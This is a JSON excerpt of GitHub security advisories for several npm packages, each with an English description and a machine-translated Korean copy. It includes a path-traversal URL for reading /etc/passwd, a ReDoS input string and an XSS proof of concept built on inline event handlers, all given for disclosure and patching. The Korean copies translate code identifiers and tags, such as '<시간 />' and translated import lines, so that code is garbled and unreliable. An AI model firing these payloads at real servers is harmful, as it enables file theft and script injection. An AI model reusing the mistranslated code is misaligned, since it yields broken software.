    "description": "### Summary\nMissing check vulnerability in the static file handler allows any client to access the files in the server's file system\n\n### Details\nWhen `staticFiles` is set in the `serve` settings in the configuration file, the following handler doesn't check if `absolutePath` is still under the directory provided as `staticFiles`;\n\n```ts\n  if (staticFiles) {\n    router.get('/:relativePath+', async request => {\n      let { relativePath } = request.params;\n      if (!relativePath) {\n        relativePath = 'index.html';\n      }\n      const absolutePath = path.join(baseDir, staticFiles, relativePath);\n      if (absolutePath.includes(staticFiles) && (await pathExists(absolutePath))) {\n        const readStream = fs.createReadStream(absolutePath);\n        return new Response(readStream as any, {\n          status: 200,\n        });\n      }\n      return undefined;\n    });\n ```\n\n### Example scenario\nTo reproduce it, set `staticFiles` to the relative path of a directory in `.meshrc.yml`;\n\n```yml\nserve:\n   staticFiles: ./public\n```\n\nThen start the server with `mesh dev`, and browse to `/..%2fpackage.json` then you will see the content of `package.json`. You can even go deeper to see sensitive data; `/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd`\n\n### Impact and solution\nIf `staticFiles` is set under `serve` in the configuration file. you have two options to fix vulnerability;\n\n- Update `@graphql-mesh/cli` to a version higher than `0.82.21`, and if you use `@graphql-mesh/http`, update it to a version higher than `0.3.18`\n- Remove `staticFiles` option from the configuration, and use other solutions to serve static files.\n\n### Credits\nThanks [alanwillms@gmail.com](mailto:alanwillms@gmail.com) for reporting this vulnerability with details",
    "identifiers": "GHSA : GHSA-j2wh-wrv3-4x4g",
    "severity": "MODERATE",
    "updatedAt": "2023-02-16T18:41:08Z",
    "publishedAt": "2023-02-16T18:41:07Z",
    "references": "https://github.com/Urigo/graphql-mesh/security/advisories/GHSA-j2wh-wrv3-4x4g\nhttps://github.com/Urigo/graphql-mesh/commit/95d93e7c140c2995b37e9d822aa3fe4e24ed2e78\nhttps://github.com/advisories/GHSA-j2wh-wrv3-4x4g",
    "name": "@graphql-mesh/cli",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0.78.0, < 0.82.22",
    "identifier": "0.82.22",
    "descriptionKR": "### 요약\n정적 파일 처리기의 누락 확인 취약점으로 인해 모든 클라이언트가 서버의 파일 시스템에 있는 파일에 액세스할 수 있습니다.\n\n### 세부 정보\n구성 파일의 `serve` 설정에서 `staticFiles`가 설정되면 다음 핸들러는 `absolutePath`가 여전히 `staticFiles`로 제공된 디렉토리 아래에 있는지 확인하지 않습니다.\n\n```ts\n  if(정적 파일) {\n    router.get('/:relativePath+', 비동기 요청 => {\n      let {relativePath} = request.params;\n      if (!relativePath) {\n        상대경로 = 'index.html';\n      }\n      const absolutePath = path.join(baseDir, staticFiles, relativePath);\n      if (absolutePath.includes(staticFiles) && (await pathExists(absolutePath))) {\n        const readStream = fs.createReadStream(absolutePath);\n        새로운 응답을 반환(readStream as any, {\n          상태: 200,\n        });\n      }\n      정의되지 않은 반환;\n    });\n ```\n\n### 예제 시나리오\n이를 재현하려면 `staticFiles`를 `.meshrc.yml`에 있는 디렉토리의 상대 경로로 설정하십시오.\n\n```yml\n제공하다:\n   정적 파일: ./public\n```\n\n그런 다음 `mesh dev`로 서버를 시작하고 `/..%2fpackage.json`으로 이동하면 `package.json`의 내용이 표시됩니다. 민감한 데이터를 보기 위해 더 깊이 들어갈 수도 있습니다. `/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc /passwd`\n\n### 영향 및 솔루션\n구성 파일의 `serve` 아래에 `staticFiles`가 설정된 경우. 취약점을 수정하는 두 가지 옵션이 있습니다.\n\n- `@graphql-mesh/cli`를 `0.82.21` 이상으로 업데이트하고 `@graphql-mesh/http`를 사용하는 경우 `0.3.18` 이상으로 업데이트\n- 구성에서 `staticFiles` 옵션을 제거하고 다른 솔루션을 사용하여 정적 파일을 제공합니다.\n\n### 크레딧\n이 취약점을 자세히 보고해 주신 [alanwillms@gmail.com](mailto:alanwillms@gmail.com)에게 감사드립니다."
  },
  {
    "description": "### Impact\n\n* The multipart body parser accepts an unlimited number of file parts.\n* The multipart body parser accepts an unlimited number of field parts.\n* The multipart body parser accepts an unlimited number of empty parts as field\nparts.\n\n\n### Patches\n\nThis is fixed in v7.4.1 (for Fastify v4.x) and v6.0.1 (for Fastify v3.x).\n\n### Workarounds\n\nThere are no known workaround.  \n\n### References\n\nReported at https://hackerone.com/reports/1816195.",
    "identifiers": "GHSA : GHSA-hpp2-2cr5-pf6g\nCVE : CVE-2023-25576",
    "severity": "HIGH",
    "updatedAt": "2023-02-22T18:35:10Z",
    "publishedAt": "2023-02-14T21:49:55Z",
    "references": "https://github.com/fastify/fastify-multipart/security/advisories/GHSA-hpp2-2cr5-pf6g\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-25576\nhttps://github.com/fastify/fastify-multipart/commit/85be81bedf5b29cfd9fe3efc30fb5a17173c1297\nhttps://hackerone.com/reports/1816195\nhttps://github.com/fastify/fastify-multipart/releases/tag/v6.0.1\nhttps://github.com/fastify/fastify-multipart/releases/tag/v7.4.1\nhttps://github.com/advisories/GHSA-hpp2-2cr5-pf6g",
    "name": "@fastify/multipart",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 7.0.0, < 7.4.1",
    "identifier": "7.4.1",
    "descriptionKR": "### 영향\n\n* 멀티파트 본문 파서는 무제한의 파일 파트를 허용합니다.\n* 멀티파트 본문 파서는 무제한의 필드 파트를 허용합니다.\n* 멀티파트 본문 파서는 비어 있는 부분을 필드로 무제한 허용합니다.\n부속.\n\n\n### 패치\n\n이는 v7.4.1(Fastify v4.x용) 및 v6.0.1(Fastify v3.x용)에서 수정되었습니다.\n\n### 해결 방법\n\n알려진 해결 방법이 없습니다.\n\n### 참조\n\nhttps://hackerone.com/reports/1816195에서 보고되었습니다."
  },
  {
    "description": "### Impact\n\n* The multipart body parser accepts an unlimited number of file parts.\n* The multipart body parser accepts an unlimited number of field parts.\n* The multipart body parser accepts an unlimited number of empty parts as field\nparts.\n\n\n### Patches\n\nThis is fixed in v7.4.1 (for Fastify v4.x) and v6.0.1 (for Fastify v3.x).\n\n### Workarounds\n\nThere are no known workaround.  \n\n### References\n\nReported at https://hackerone.com/reports/1816195.",
    "identifiers": "GHSA : GHSA-hpp2-2cr5-pf6g\nCVE : CVE-2023-25576",
    "severity": "HIGH",
    "updatedAt": "2023-02-22T18:35:10Z",
    "publishedAt": "2023-02-14T21:49:55Z",
    "references": "https://github.com/fastify/fastify-multipart/security/advisories/GHSA-hpp2-2cr5-pf6g\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-25576\nhttps://github.com/fastify/fastify-multipart/commit/85be81bedf5b29cfd9fe3efc30fb5a17173c1297\nhttps://hackerone.com/reports/1816195\nhttps://github.com/fastify/fastify-multipart/releases/tag/v6.0.1\nhttps://github.com/fastify/fastify-multipart/releases/tag/v7.4.1\nhttps://github.com/advisories/GHSA-hpp2-2cr5-pf6g",
    "name": "@fastify/multipart",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.0.1",
    "identifier": "6.0.1",
    "descriptionKR": "### 영향\n\n* 멀티파트 본문 파서는 무제한의 파일 파트를 허용합니다.\n* 멀티파트 본문 파서는 무제한의 필드 파트를 허용합니다.\n* 멀티파트 본문 파서는 비어 있는 부분을 필드로 무제한 허용합니다.\n부속.\n\n\n### 패치\n\n이는 v7.4.1(Fastify v4.x용) 및 v6.0.1(Fastify v3.x용)에서 수정되었습니다.\n\n### 해결 방법\n\n알려진 해결 방법이 없습니다.\n\n### 참조\n\nhttps://hackerone.com/reports/1816195에서 보고되었습니다."
  },
  {
    "description": "### Impact\n\nThis vulnerability allows a malicious actor with access to add or modify content in an instance of the Backstage software catalog to inject script URLs in the entities stored in the catalog. If users of the catalog then click on said URLs, that can lead to an XSS attack.\n\n### Patches\n\nThis vulnerability has been patched in both the frontend and backend implementations. The default `Link` component from `@backstage/core-components` will now reject `javascript:` URLs, and there is a global override of `window.open` to do the same.\n\nIn addition the catalog model as well as the catalog backend now has additional validation built in that prevents `javascript:` URLs in known annotations.\n\n### Workarounds\n\nThe general practice of limiting access to modifying catalog content and requiring code reviews greatly helps mitigate this vulnerability.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in the [Backstage repository](https://github.com/backstage/backstage)\n* Visit our chat, linked to in the [Backstage README](https://github.com/backstage/backstage)\n",
    "identifiers": "GHSA : GHSA-7hv8-3fr9-j2hv\nCVE : CVE-2023-25571",
    "severity": "MODERATE",
    "updatedAt": "2023-02-14T21:35:13Z",
    "publishedAt": "2023-02-14T21:35:10Z",
    "references": "https://github.com/backstage/backstage/security/advisories/GHSA-7hv8-3fr9-j2hv\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-25571\nhttps://github.com/backstage/backstage/commit/3d1371954512f7fa8bd0e2d357e00eada2c3e8a8\nhttps://github.com/advisories/GHSA-7hv8-3fr9-j2hv",
    "name": "@backstage/plugin-catalog-backend",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.7.2",
    "identifier": "1.7.2",
    "descriptionKR": "### 영향\n\n이 취약점을 통해 Backstage 소프트웨어 카탈로그의 인스턴스에서 콘텐츠를 추가하거나 수정할 수 있는 액세스 권한이 있는 악의적인 행위자가 카탈로그에 저장된 엔터티에 스크립트 URL을 삽입할 수 있습니다. 카탈로그 사용자가 해당 URL을 클릭하면 XSS 공격이 발생할 수 있습니다.\n\n### 패치\n\n이 취약점은 프런트엔드 및 백엔드 구현 모두에서 패치되었습니다. `@backstage/core-components`의 기본 `Link` 구성 요소는 이제 `javascript:` URL을 거부하며 동일한 작업을 수행하기 위해 `window.open`의 전역 재정의가 있습니다.\n\n또한 카탈로그 모델과 카탈로그 백엔드에는 이제 알려진 주석의 'javascript:' URL을 방지하는 추가 유효성 검사가 내장되어 있습니다.\n\n### 해결 방법\n\n카탈로그 콘텐츠 수정에 대한 액세스를 제한하고 코드 검토를 요구하는 일반적인 관행은 이 취약점을 완화하는 데 크게 도움이 됩니다.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n* [Backstage 저장소](https://github.com/backstage/backstage)에서 이슈 열기\n* [Backstage README](https://github.com/backstage/backstage)에 링크된 채팅을 방문하세요."
  },
  {
    "description": "### Impact\n\nThis vulnerability allows a malicious actor with access to add or modify content in an instance of the Backstage software catalog to inject script URLs in the entities stored in the catalog. If users of the catalog then click on said URLs, that can lead to an XSS attack.\n\n### Patches\n\nThis vulnerability has been patched in both the frontend and backend implementations. The default `Link` component from `@backstage/core-components` will now reject `javascript:` URLs, and there is a global override of `window.open` to do the same.\n\nIn addition the catalog model as well as the catalog backend now has additional validation built in that prevents `javascript:` URLs in known annotations.\n\n### Workarounds\n\nThe general practice of limiting access to modifying catalog content and requiring code reviews greatly helps mitigate this vulnerability.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in the [Backstage repository](https://github.com/backstage/backstage)\n* Visit our chat, linked to in the [Backstage README](https://github.com/backstage/backstage)\n",
    "identifiers": "GHSA : GHSA-7hv8-3fr9-j2hv\nCVE : CVE-2023-25571",
    "severity": "MODERATE",
    "updatedAt": "2023-02-14T21:35:13Z",
    "publishedAt": "2023-02-14T21:35:10Z",
    "references": "https://github.com/backstage/backstage/security/advisories/GHSA-7hv8-3fr9-j2hv\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-25571\nhttps://github.com/backstage/backstage/commit/3d1371954512f7fa8bd0e2d357e00eada2c3e8a8\nhttps://github.com/advisories/GHSA-7hv8-3fr9-j2hv",
    "name": "@backstage/catalog-model",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.2.0",
    "identifier": "1.2.0",
    "descriptionKR": "### 영향\n\n이 취약점을 통해 Backstage 소프트웨어 카탈로그의 인스턴스에서 콘텐츠를 추가하거나 수정할 수 있는 액세스 권한이 있는 악의적인 행위자가 카탈로그에 저장된 엔터티에 스크립트 URL을 삽입할 수 있습니다. 카탈로그 사용자가 해당 URL을 클릭하면 XSS 공격이 발생할 수 있습니다.\n\n### 패치\n\n이 취약점은 프런트엔드 및 백엔드 구현 모두에서 패치되었습니다. `@backstage/core-components`의 기본 `Link` 구성 요소는 이제 `javascript:` URL을 거부하며 동일한 작업을 수행하기 위해 `window.open`의 전역 재정의가 있습니다.\n\n또한 카탈로그 모델과 카탈로그 백엔드에는 이제 알려진 주석의 'javascript:' URL을 방지하는 추가 유효성 검사가 내장되어 있습니다.\n\n### 해결 방법\n\n카탈로그 콘텐츠 수정에 대한 액세스를 제한하고 코드 검토를 요구하는 일반적인 관행은 이 취약점을 완화하는 데 크게 도움이 됩니다.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n* [Backstage 저장소](https://github.com/backstage/backstage)에서 이슈 열기\n* [Backstage README](https://github.com/backstage/backstage)에 링크된 채팅을 방문하세요."
  },
  {
    "description": "### Impact\n\nThis vulnerability allows a malicious actor with access to add or modify content in an instance of the Backstage software catalog to inject script URLs in the entities stored in the catalog. If users of the catalog then click on said URLs, that can lead to an XSS attack.\n\n### Patches\n\nThis vulnerability has been patched in both the frontend and backend implementations. The default `Link` component from `@backstage/core-components` will now reject `javascript:` URLs, and there is a global override of `window.open` to do the same.\n\nIn addition the catalog model as well as the catalog backend now has additional validation built in that prevents `javascript:` URLs in known annotations.\n\n### Workarounds\n\nThe general practice of limiting access to modifying catalog content and requiring code reviews greatly helps mitigate this vulnerability.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in the [Backstage repository](https://github.com/backstage/backstage)\n* Visit our chat, linked to in the [Backstage README](https://github.com/backstage/backstage)\n",
    "identifiers": "GHSA : GHSA-7hv8-3fr9-j2hv\nCVE : CVE-2023-25571",
    "severity": "MODERATE",
    "updatedAt": "2023-02-14T21:35:13Z",
    "publishedAt": "2023-02-14T21:35:10Z",
    "references": "https://github.com/backstage/backstage/security/advisories/GHSA-7hv8-3fr9-j2hv\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-25571\nhttps://github.com/backstage/backstage/commit/3d1371954512f7fa8bd0e2d357e00eada2c3e8a8\nhttps://github.com/advisories/GHSA-7hv8-3fr9-j2hv",
    "name": "@backstage/core-components",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.12.4",
    "identifier": "0.12.4",
    "descriptionKR": "### 영향\n\n이 취약점을 통해 Backstage 소프트웨어 카탈로그의 인스턴스에서 콘텐츠를 추가하거나 수정할 수 있는 액세스 권한이 있는 악의적인 행위자가 카탈로그에 저장된 엔터티에 스크립트 URL을 삽입할 수 있습니다. 카탈로그 사용자가 해당 URL을 클릭하면 XSS 공격이 발생할 수 있습니다.\n\n### 패치\n\n이 취약점은 프런트엔드 및 백엔드 구현 모두에서 패치되었습니다. `@backstage/core-components`의 기본 `Link` 구성 요소는 이제 `javascript:` URL을 거부하며 동일한 작업을 수행하기 위해 `window.open`의 전역 재정의가 있습니다.\n\n또한 카탈로그 모델과 카탈로그 백엔드에는 이제 알려진 주석의 'javascript:' URL을 방지하는 추가 유효성 검사가 내장되어 있습니다.\n\n### 해결 방법\n\n카탈로그 콘텐츠 수정에 대한 액세스를 제한하고 코드 검토를 요구하는 일반적인 관행은 이 취약점을 완화하는 데 크게 도움이 됩니다.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n* [Backstage 저장소](https://github.com/backstage/backstage)에서 이슈 열기\n* [Backstage README](https://github.com/backstage/backstage)에 링크된 채팅을 방문하세요."
  },
  {
    "description": "Versions of the package glance before 3.0.9 are vulnerable to Directory Traversal that allows users to read files outside the public root directory. This is related to but distinct from the vulnerability reported in [CVE-2018-3715](https://security.snyk.io/vuln/npm:glance:20180129).",
    "identifiers": "GHSA : GHSA-3hjh-5hgx-f5wh\nCVE : CVE-2022-25937",
    "severity": "MODERATE",
    "updatedAt": "2023-02-24T16:02:46Z",
    "publishedAt": "2023-02-13T06:30:59Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25937\nhttps://github.com/jarofghosts/glance/commit/8cecfe90286e0c45a5494067f1b592d0ccfeabac\nhttps://security.snyk.io/vuln/SNYK-JS-GLANCE-3318395\nhttps://gist.github.com/lirantal/c8cfb0398c78e558b7d4ac02aae67809\nhttps://github.com/advisories/GHSA-3hjh-5hgx-f5wh",
    "name": "glance",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.0.9",
    "identifier": "3.0.9",
    "descriptionKR": "3.0.9 이전 패키지 버전은 사용자가 공용 루트 디렉터리 외부의 파일을 읽을 수 있도록 허용하는 디렉터리 탐색에 취약합니다. 이는 [CVE-2018-3715](https://security.snyk.io/vuln/npm:glance:20180129)에서 보고된 취약점과 관련이 있지만 별개입니다."
  },
  {
    "description": "A vulnerability has been found in simple-markdown 0.5.1 and classified as problematic. Affected by this vulnerability is an unknown functionality of the file simple-markdown.js. The manipulation leads to inefficient regular expression complexity. The attack can be launched remotely. Upgrading to version 0.5.2 is able to address this issue. The name of the patch is 89797fef9abb4cab2fb76a335968266a92588816. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-220639.",
    "identifiers": "GHSA : GHSA-gpvj-gp8c-c7p2\nCVE : CVE-2019-25103",
    "severity": "HIGH",
    "updatedAt": "2023-02-24T16:01:14Z",
    "publishedAt": "2023-02-12T15:30:24Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-25103\nhttps://github.com/ariabuckles/simple-markdown/commit/89797fef9abb4cab2fb76a335968266a92588816\nhttps://github.com/ariabuckles/simple-markdown/releases/tag/0.5.2\nhttps://vuldb.com/?ctiid.220639\nhttps://vuldb.com/?id.220639\nhttps://github.com/advisories/GHSA-gpvj-gp8c-c7p2",
    "name": "simple-markdown",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.5.2",
    "identifier": "0.5.2",
    "descriptionKR": "simple-markdown 0.5.1에서 취약점이 발견되어 문제가 있는 것으로 분류되었습니다. 이 취약점의 영향을 받는 것은 simple-markdown.js 파일의 알려지지 않은 기능입니다. 조작은 비효율적인 정규식 복잡성을 초래합니다. 공격은 원격으로 시작할 수 있습니다. 버전 0.5.2로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치의 이름은 89797fef9abb4cab2fb76a335968266a92588816입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. 이 취약점의 관련 식별자는 VDB-220639입니다."
  },
  {
    "description": "A vulnerability, which was classified as problematic, was found in simple-markdown 0.6.0. Affected is an unknown function of the file simple-markdown.js. The manipulation with the input <<<<<<<<<<:/:/:/:/:/:/:/:/:/:/ leads to inefficient regular expression complexity. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 0.6.1 is able to address this issue. The name of the patch is 015a719bf5cdc561feea05500ecb3274ef609cd2. It is recommended to upgrade the affected component. VDB-220638 is the identifier assigned to this vulnerability.",
    "identifiers": "GHSA : GHSA-j533-2g8v-pmpg\nCVE : CVE-2019-25102",
    "severity": "HIGH",
    "updatedAt": "2023-02-22T16:32:01Z",
    "publishedAt": "2023-02-12T15:30:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-25102\nhttps://github.com/ariabuckles/simple-markdown/pull/73\nhttps://github.com/ariabuckles/simple-markdown/commit/015a719bf5cdc561feea05500ecb3274ef609cd2\nhttps://github.com/ariabuckles/simple-markdown/releases/tag/0.6.1\nhttps://vuldb.com/?ctiid.220638\nhttps://vuldb.com/?id.220638\nhttps://github.com/advisories/GHSA-j533-2g8v-pmpg",
    "name": "simple-markdown",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.6.1",
    "identifier": "0.6.1",
    "descriptionKR": "문제성으로 분류된 취약점이 simple-markdown 0.6.0에서 발견되었습니다. 영향을 받는 것은 simple-markdown.js 파일의 알 수 없는 기능입니다. <<<<<<<<<<:/:/:/:/:/:/:/:/:/:/ 입력으로 조작하면 비효율적인 정규식이 복잡해집니다. 공격을 원격으로 시작할 수 있습니다. 익스플로잇은 대중에게 공개되었으며 사용될 수 있습니다. 버전 0.6.1로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치 이름은 015a719bf5cdc561feea05500ecb3274ef609cd2입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. VDB-220638은 이 취약점에 할당된 식별자입니다."
  },
  {
    "description": "### Impact\n\nAll React applications built with react-admin and using the `<RichTextField>` are affected. \n\n`<RichTextField>` outputs the field value using `dangerouslySetInnerHTML` without client-side sanitization. If the data isn't sanitized server-side, this opens a possible Cross-Site-Scripting (XSS) attack. \n\nProof of concept:\n\n```jsx\nimport { RichTextField } from 'react-admin';\n\nconst record = {\n    id: 1,\n    body: `\n<p>\n<strong>War and Peace</strong> is a novel by the Russian author\n<a href=\"https://en.wikipedia.org/wiki/Leo_Tolstoy\" onclick=\"document.getElementById('stolendata').value='credentials';\">Leo Tolstoy</a>,\npublished serially, then in its entirety in 1869.\n</p>\n<p onmouseover=\"document.getElementById('stolendata').value='credentials';\">\nIt is regarded as one of Tolstoy's finest literary achievements and remains a classic of world literature.\n</p>\n<img src=\"x\" onerror=\"document.getElementById('stolendata').value='credentials';\" />\n`,\n};\n\nconst VulnerableRichTextField = () => (\n    <>\n        <RichTextField record={record} source=\"body\" />\n        <hr />\n        <h4>Stolen data:</h4>\n        <input id=\"stolendata\" defaultValue=\"none\" />\n    </>\n);\n```\n\n### Patches\n\nVersions 3.19.12 and 4.7.6 now use `DOMPurify` to escape the HTML before outputting it with React and `dangerouslySetInnerHTML`\n\n### Workarounds\n\nYou don't need to upgrade if you already sanitize HTML data server-side. \n\nOtherwise, you'll have to replace the `<RichTextField>` by a custom field doing sanitization by hand:\n\n```tsx\n// react-admin v4\nimport * as React from 'react';\nimport { memo } from 'react';\nimport PropTypes from 'prop-types';\nimport get from 'lodash/get';\nimport Typography from '@material-ui/core/Typography';\nimport { useRecordContext, sanitizeFieldRestProps, fieldPropTypes } from 'react-admin';\nimport purify from 'dompurify';\n\nexport const removeTags = (input) =>\n    input ? input.replace(/<[^>]+>/gm, '') : '';\n\nconst RichTextField = memo(\n    props => {\n        const { className, emptyText, source, stripTags, ...rest } = props;\n        const record = useRecordContext(props);\n        const value = get(record, source);\n\n        return (\n            <Typography\n                className={className}\n                variant=\"body2\"\n                component=\"span\"\n                {...sanitizeFieldRestProps(rest)}\n            >\n                {value == null && emptyText ? (\n                    emptyText\n                ) : stripTags ? (\n                    removeTags(value)\n                ) : (\n                    <span\n                        dangerouslySetInnerHTML={{\n                            __html: purify.sanitize(value),\n                        }}\n                    />\n                )}\n            </Typography>\n        );\n    }\n);\n\nRichTextField.defaultProps = {\n    addLabel: true,\n    stripTags: false,\n};\n\nRichTextField.propTypes = {\n    // @ts-ignore\n    ...Typography.propTypes,\n    ...fieldPropTypes,\n    stripTags: PropTypes.bool,\n};\n\nRichTextField.displayName = 'RichTextField';\n\nexport default RichTextField;\n```\n\n### References\n\nhttps://github.com/marmelab/react-admin/pull/8644, https://github.com/marmelab/react-admin/pull/8645\n",
    "identifiers": "GHSA : GHSA-5jcr-82fh-339v\nCVE : CVE-2023-25572",
    "severity": "MODERATE",
    "updatedAt": "2023-02-22T22:16:55Z",
    "publishedAt": "2023-02-14T00:32:21Z",
    "references": "https://github.com/marmelab/react-admin/security/advisories/GHSA-5jcr-82fh-339v\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-25572\nhttps://github.com/marmelab/react-admin/pull/8644\nhttps://github.com/marmelab/react-admin/pull/8645\nhttps://github.com/marmelab/react-admin/releases/tag/v3.19.12\nhttps://github.com/marmelab/react-admin/releases/tag/v4.7.6\nhttps://github.com/advisories/GHSA-5jcr-82fh-339v",
    "name": "ra-ui-materialui",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.19.12",
    "identifier": "3.19.12",
    "descriptionKR": "### 영향\n\nreact-admin으로 빌드되고 `<RichTextField>`를 사용하는 모든 React 애플리케이션이 영향을 받습니다.\n\n`<RichTextField>`는 클라이언트 측 삭제 없이 `dangerouslySetInnerHTML`을 사용하여 필드 값을 출력합니다. 데이터가 서버 측에서 삭제되지 않으면 XSS(Cross-Site-Scripting) 공격이 발생할 수 있습니다.\n\n개념의 증거:\n\n```jsx\nimport { RichTextField } from 'react-admin';\n\nconst 레코드 = {\n    아이디: 1,\n    본문: `\n<p>\n<strong>전쟁과 평화</strong>는 러시아 작가의 소설입니다.\n<a href=\"https://en.wikipedia.org/wiki/Leo_Tolstoy\" onclick=\"document.getElementById('stolendata').value='credentials';\">레오 톨스토이</a>,\n연재된 후 1869년에 전체가 출판되었습니다.\n</p>\n<p onmouseover=\"document.getElementById('stolendata').value='credentials';\">\n톨스토이의 가장 훌륭한 문학적 업적 중 하나로 간주되며 세계 문학의 고전으로 남아 있습니다.\n</p>\n<img src=\"x\" onerror=\"document.getElementById('stolendata').value='자격증명';\" />\n`,\n};\n\nconst VulnerableRichTextField = () => (\n    <>\n        <RichTextField 레코드={레코드} 소스=\"본문\" />\n        <시간 />\n        <h4>도난된 데이터:</h4>\n        <input id=\"stolendata\" defaultValue=\"없음\" />\n    </>\n);\n```\n\n### 패치\n\n버전 3.19.12 및 4.7.6은 이제 'DOMPurify'를 사용하여 React 및 'dangerouslySetInnerHTML'로 HTML을 출력하기 전에 HTML을 이스케이프 처리합니다.\n\n### 해결 방법\n\nHTML 데이터 서버 측을 이미 삭제했다면 업그레이드할 필요가 없습니다.\n\n그렇지 않으면 `<RichTextField>`를 수동으로 삭제하는 사용자 정의 필드로 교체해야 합니다.\n\n```tsx\n// 반응 관리자 v4\nimport * as React from 'react';\n'반응'에서 { 메모 } 가져오기;\n'prop-types'에서 PropTypes 가져오기;\n'lodash/get'에서 가져오기 가져오기;\n'@material-ui/core/Typography'에서 타이포그래피 가져오기;\nimport { useRecordContext, sanitizeFieldRestProps, fieldPropTypes } from 'react-admin';\n'dompurify'에서 가져오기 정화;\n\n내보내기 const removeTags = (입력) =>\n    입력? input.replace(/<[^>]+>/gm, '') : '';\n\nconst RichTextField = 메모(\n    소품 => {\n        const { className, emptyText, source, stripTags, ...rest } = 소품;\n        const 레코드 = useRecordContext(props);\n        const 값 = get(레코드, 소스);\n\n        반품 (\n            <타이포그래피\n                클래스이름={클래스이름}\n                변형 = \"body2\"\n                구성요소=\"스팬\"\n                {...sanitizeFieldRestProps(rest)}\n            >\n                {value == null && emptyText ? (\n                    빈 텍스트\n                ) : stripTags ? (\n                    제거태그(값)\n                ) : (\n                    <스팬\n                        dangerlySetInnerHTML={{\n                            __html: purify.sanitize(값),\n                        }}\n                    />\n                )}\n            </타이포그래피>\n        );\n    }\n);\n\nRichTextField.defaultProps = {\n    addLabel: 참,\n    stripTags: 거짓,\n};\n\nRichTextField.propTypes = {\n    // @ts-무시\n    ...Typography.propTypes,\n    ...fieldPropTypes,\n    stripTags: PropTypes.bool,\n};\n\nRichTextField.displayName = '리치텍스트필드';\n\n기본 RichTextField 내보내기;\n```\n\n### 참조\n\nhttps://github.com/marmelab/react-admin/pull/8644, https://github.com/marmelab/react-admin/pull/8645"
  },
  {
    "description": "### Impact\n\nAll React applications built with react-admin and using the `<RichTextField>` are affected. \n\n`<RichTextField>` outputs the field value using `dangerouslySetInnerHTML` without client-side sanitization. If the data isn't sanitized server-side, this opens a possible Cross-Site-Scripting (XSS) attack. \n\nProof of concept:\n\n```jsx\nimport { RichTextField } from 'react-admin';\n\nconst record = {\n    id: 1,\n    body: `\n<p>\n<strong>War and Peace</strong> is a novel by the Russian author\n<a href=\"https://en.wikipedia.org/wiki/Leo_Tolstoy\" onclick=\"document.getElementById('stolendata').value='credentials';\">Leo Tolstoy</a>,\npublished serially, then in its entirety in 1869.\n</p>\n<p onmouseover=\"document.getElementById('stolendata').value='credentials';\">\nIt is regarded as one of Tolstoy's finest literary achievements and remains a classic of world literature.\n</p>\n<img src=\"x\" onerror=\"document.getElementById('stolendata').value='credentials';\" />\n`,\n};\n\nconst VulnerableRichTextField = () => (\n    <>\n        <RichTextField record={record} source=\"body\" />\n        <hr />\n        <h4>Stolen data:</h4>\n        <input id=\"stolendata\" defaultValue=\"none\" />\n    </>\n);\n```\n\n### Patches\n\nVersions 3.19.12 and 4.7.6 now use `DOMPurify` to escape the HTML before outputting it with React and `dangerouslySetInnerHTML`\n\n### Workarounds\n\nYou don't need to upgrade if you already sanitize HTML data server-side. \n\nOtherwise, you'll have to replace the `<RichTextField>` by a custom field doing sanitization by hand:\n\n```tsx\n// react-admin v4\nimport * as React from 'react';\nimport { memo } from 'react';\nimport PropTypes from 'prop-types';\nimport get from 'lodash/get';\nimport Typography from '@material-ui/core/Typography';\nimport { useRecordContext, sanitizeFieldRestProps, fieldPropTypes } from 'react-admin';\nimport purify from 'dompurify';\n\nexport const removeTags = (input) =>\n    input ? input.replace(/<[^>]+>/gm, '') : '';\n\nconst RichTextField = memo(\n    props => {\n        const { className, emptyText, source, stripTags, ...rest } = props;\n        const record = useRecordContext(props);\n        const value = get(record, source);\n\n        return (\n            <Typography\n                className={className}\n                variant=\"body2\"\n                component=\"span\"\n                {...sanitizeFieldRestProps(rest)}\n            >\n                {value == null && emptyText ? (\n                    emptyText\n                ) : stripTags ? (\n                    removeTags(value)\n                ) : (\n                    <span\n                        dangerouslySetInnerHTML={{\n                            __html: purify.sanitize(value),\n                        }}\n                    />\n                )}\n            </Typography>\n        );\n    }\n);\n\nRichTextField.defaultProps = {\n    addLabel: true,\n    stripTags: false,\n};\n\nRichTextField.propTypes = {\n    // @ts-ignore\n    ...Typography.propTypes,\n    ...fieldPropTypes,\n    stripTags: PropTypes.bool,\n};\n\nRichTextField.displayName = 'RichTextField';\n\nexport default 